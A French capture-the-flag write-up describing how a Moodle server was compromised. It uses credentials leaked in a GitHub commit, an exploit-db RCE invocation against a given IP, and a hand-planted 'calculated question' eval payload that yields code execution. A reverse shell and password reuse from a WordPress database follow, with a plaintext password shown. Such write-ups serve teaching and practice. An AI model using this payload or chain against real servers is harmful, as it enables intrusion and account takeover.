# Route Moi - Mel
## Présentation

Le but de ce challenge est d'obtenir un shell sur la machine en tant qu'utilisateur Mel.

**Catégorie :** Réaliste  
**Points :** 400

## Résolution

Le challenge débute sur un serveur web avec Moodle installé dessus.
Il y a un cours qui ne nous apprend pas grand chose, si ce n'est l'existance [d'un github](https://github.com/melTHEboss/php_exploit) appartenant à l'auteur.

En se rendant dessus, il y a un répo `php_exploit` avec un commit "OOOOOOPS wrong commit".  
En regardant le diff, on retrouve un fichier `config.php.bak` qui contient les identifiants Moodle ainsi que les infos de la bdd.  
On peut donc maintenant se connecter en tant que `meltheboss` sur le Moodle.

Après quelques rapides recherches, on se rend compte qu'il existe un exploit RCE pour cette version spécifique de moodle (https://www.exploit-db.com/exploits/46551).

La faille réside dans la fonction "question dynamique" qui peut être exploitée jusqu'à un `eval()` de code.

```
➜  php 46551.php url=http://217.160.15.230:36471 user=meltheboss pass=[Je l'ai plus] ip=x.x.x.x port=4242 course=2
```

Toute les étapes se passent bien, jusqu'à la dernière `[*] Adding Evil Question` qui ne fonctionne pas.
À ce moment là, deux possibilités : on corrige l'exploit ou on termine à la main.

On va donc terminer l'exploitation à la mano à l'aide de [cet article de blog](https://blog.ripstech.com/2018/moodle-remote-code-execution). Il nous suffit d'utiliser les éléments déjà créés par notre exploit, et d'y ajouter manuellement la fameuse question piégée avec le payload ``/*{a*/`$_GET[0]`;//{x}}``.

On est maintenant en mesure d'exécuter du code par le paramètre GET 0. On en profite pour se créer un reverse shell, et nous voila connecté en tant qu'utilisatuer `www-data`.

On doit maintenant réussir à se connecter en tant que `meltheboss`.  
Nos droits étant limités, on compte sur une réutilisation de mot de passe.

On dispose toujours des identifiants mysql récupérés sur le git. C'est le moment de voir si on peut en tirer quelque chose.  
Et en effet, il y a une base mysql "wordpress" avec une table "wp_users" dans laquelle se trouve un utilisateur `meltheboss` ainsi que son mot de passe en base64 (`P4ssw0rd0fm3l!!`).

Le flag se trouve dans `/home/meltheboss/flag.txt`.